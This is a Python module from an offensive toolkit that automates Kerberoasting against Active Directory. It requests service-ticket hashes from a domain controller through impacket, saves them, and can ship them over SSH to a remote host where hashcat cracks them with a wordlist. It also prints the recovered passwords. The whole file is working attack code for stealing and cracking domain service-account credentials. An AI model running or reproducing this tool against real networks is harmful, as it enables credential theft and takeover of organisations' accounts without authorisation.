"""
Kerberoasting Module
Request TGS tickets for SPNs and crack offline
Supports execution via Exegol container or local tools
"""

import os
import subprocess
import base64
import random
from core.module_base import ModuleBase, ModuleType, Platform, find_tool


class Kerberoast(ModuleBase):
    """
    Kerberoasting attack module
    Requests TGS tickets for service accounts with SPNs
    Automatically uses Exegol container if local tools not found
    Optionally auto-cracks hashes via SSH to host with hashcat
    """

    def __init__(self):
        super().__init__()
        self.name = "kerberoast"
        self.description = "Kerberoast attack - request TGS tickets for cracking"
        self.author = "UwU Toolkit"
        self.version = "1.1.0"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.WINDOWS
        self.tags = ["ad", "kerberos", "kerberoast", "spn", "credential", "attack"]
        self.references = [
            "https://attack.mitre.org/techniques/T1558/003/",
            "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast"
        ]

        # Register options
        self.register_option("RHOSTS", "Domain Controller IP", required=True)
        self.register_option("DOMAIN", "Domain name", required=True)
        self.register_option("USER", "Domain username", required=True)
        self.register_option("PASS", "Domain password", required=True)
        self.register_option("TARGET_USER", "Specific user to kerberoast (optional)", default="")
        self.register_option("OUTPUT", "Output file for hashes", default="kerberoast_hashes.txt")
        self.register_option("FORMAT", "Hash format: hashcat, john", default="hashcat",
                           choices=["hashcat", "john"])

        # Auto-crack options
        self.register_option("AUTO_CRACK", "Automatically crack hashes after retrieval",
                           default="no", choices=["yes", "no"])
        self.register_option("SSH_HOST", "SSH host for hashcat cracking", default="omarchy")
        self.register_option("SSH_USER", "SSH username (empty = current user)", default="")
        self.register_option("SSH_PORT", "SSH port", default=22)
        self.register_option("WORDLIST", "Wordlist path on remote host", default="$HOME/tools/rockyou.txt")
        self.register_option("RULES", "Rules file on remote host (optional)", default="")

    def run(self) -> bool:
        dc_ip = self.get_option("RHOSTS")
        domain = self.get_option("DOMAIN")
        user = self.get_option("USER")
        password = self.get_option("PASS")
        target_user = self.get_option("TARGET_USER")
        output = self.get_option("OUTPUT")

        self.print_status(f"Target DC: {dc_ip}")
        self.print_status(f"Domain: {domain}")
        if target_user:
            self.print_status(f"Target User: {target_user}")
        self.print_line()

        # Build command
        cmd_parts = [
            "GetUserSPNs.py",
            f"'{domain}/{user}:{password}'",
            "-dc-ip", dc_ip,
            "-request",
        ]

        if target_user:
            cmd_parts.extend(["-request-user", target_user])

        cmd = " ".join(cmd_parts)

        # Try local first, fall back to Exegol
        tool_path = find_tool("GetUserSPNs.py")
        if tool_path:
            self.print_status("Using local impacket tools")
            ret, stdout, stderr = self.run_command(
                [tool_path, f"{domain}/{user}:{password}", "-dc-ip", dc_ip, "-request"] +
                (["-request-user", target_user] if target_user else []),
                timeout=120
            )
        else:
            self.print_status("Using Exegol container for impacket tools")
            ret, stdout, stderr = self.run_in_exegol(cmd, timeout=120)

        # Process output
        output_text = stdout + stderr
        hashes_found = []

        for line in output_text.split('\n'):
            if line.strip():
                if '$krb5tgs$' in line:
                    hashes_found.append(line.strip())
                    self.print_good(f"Got TGS hash!")
                elif 'ServicePrincipalName' in line or '---' in line:
                    self.print_line(line)
                elif line.strip().startswith(('-', '[')):
                    if '[-]' in line:
                        self.print_error(line)
                    elif '[+]' in line:
                        self.print_good(line)
                    elif '[*]' in line:
                        self.print_status(line.replace('[*]', '').strip())
                else:
                    # SPN table rows
                    if '  ' in line and not line.startswith('Impacket'):
                        self.print_line(line)

        # Save hashes
        if hashes_found:
            try:
                output_path = os.path.abspath(output)
                with open(output_path, 'w') as f:
                    f.write('\n'.join(hashes_found))
                self.print_good(f"Saved {len(hashes_found)} hash(es) to: {output_path}")
            except Exception as e:
                self.print_warning(f"Could not save to file: {e}")
                self.print_line()
                self.print_status("Hashes:")
                for h in hashes_found:
                    self.print_line(h)
                return True

            # Auto-crack if enabled
            if self.get_option("AUTO_CRACK") == "yes":
                self.print_line()
                self._crack_hashes(hashes_found, output_path)
            else:
                self.print_status(f"Crack with: hashcat -m 13100 {output} wordlist.txt")
                self.print_status(f"        or: john --format=krb5tgs {output} --wordlist=wordlist.txt")

            return True
        else:
            self.print_warning("No kerberoastable users found or no hashes retrieved")
            return False

    def _crack_hashes(self, hashes: list, hash_file: str) -> bool:
        """Crack hashes via SSH to host with hashcat"""
        ssh_host = self.get_option("SSH_HOST")
        ssh_user = self.get_option("SSH_USER")
        ssh_port = self.get_option("SSH_PORT")
        wordlist = self.get_option("WORDLIST")
        rules = self.get_option("RULES")

        self.print_status(f"Starting auto-crack via SSH to {ssh_host}...")

        # Build SSH target
        ssh_target = f"{ssh_user}@{ssh_host}" if ssh_user else ssh_host
        ssh_opts = f"-o StrictHostKeyChecking=accept-new -o BatchMode=no -p {ssh_port}"

        # Create temp file on host with hashes
        temp_hash_file = f"/tmp/uwu_kerb_{random.randint(10000,99999)}.txt"

        # Clean and encode hashes
        clean_hashes = '\n'.join(h.strip() for h in hashes if h.strip())
        encoded = base64.b64encode(clean_hashes.encode()).decode()

        # Transfer hash file via SSH
        transfer_cmd = f"ssh {ssh_opts} {ssh_target} 'echo {encoded} | base64 -d > {temp_hash_file}'"
        try:
            proc = subprocess.run(transfer_cmd, shell=True, capture_output=True, text=True, timeout=30)
            if proc.returncode != 0:
                self.print_error(f"Failed to transfer hashes: {proc.stderr}")
                return False
        except subprocess.TimeoutExpired:
            self.print_error("SSH connection timed out")
            return False

        # Build hashcat command (mode 13100 = Kerberos 5 TGS-REP)
        hashcat_cmd = f"hashcat -m 13100 {temp_hash_file} {wordlist}"
        if rules:
            hashcat_cmd += f" -r {rules}"

        self.print_status(f"Running: {hashcat_cmd}")
        self.print_line()

        # Run hashcat interactively so user sees progress
        full_cmd = (f"ssh {ssh_opts} -t {ssh_target} '"
                    f"{hashcat_cmd}; "
                    f"echo; echo \"=== CRACKED ===\"; "
                    f"hashcat -m 13100 {temp_hash_file} --show 2>/dev/null; "
                    f"rm -f {temp_hash_file}'")

        try:
            result = subprocess.run(full_cmd, shell=True, timeout=None)
            self.print_line()

            # Get cracked results
            show_cmd = f"ssh {ssh_opts} {ssh_target} 'hashcat -m 13100 {temp_hash_file} --show 2>/dev/null'"
            show_result = subprocess.run(show_cmd, shell=True, capture_output=True, text=True, timeout=30)

            if show_result.stdout.strip():
                self.print_good("Cracked passwords:")
                for line in show_result.stdout.strip().split('\n'):
                    if ':' in line:
                        # Format: hash:password
                        parts = line.rsplit(':', 1)
                        if len(parts) == 2:
                            self.print_good(f"  Password: {parts[1]}")

            return result.returncode == 0

        except KeyboardInterrupt:
            self.print_warning("Interrupted - cleaning up...")
            subprocess.run(f"ssh {ssh_opts} {ssh_target} 'rm -f {temp_hash_file}'",
                          shell=True, capture_output=True)
            return False
        except Exception as e:
            self.print_error(f"Cracking failed: {e}")
            return False

    def check(self) -> bool:
        """Check if tools are available locally or via Exegol"""
        if find_tool("GetUserSPNs.py"):
            return True
        # Check Exegol
        ret, stdout, stderr = self.run_in_exegol("which GetUserSPNs.py", timeout=10)
        return ret == 0
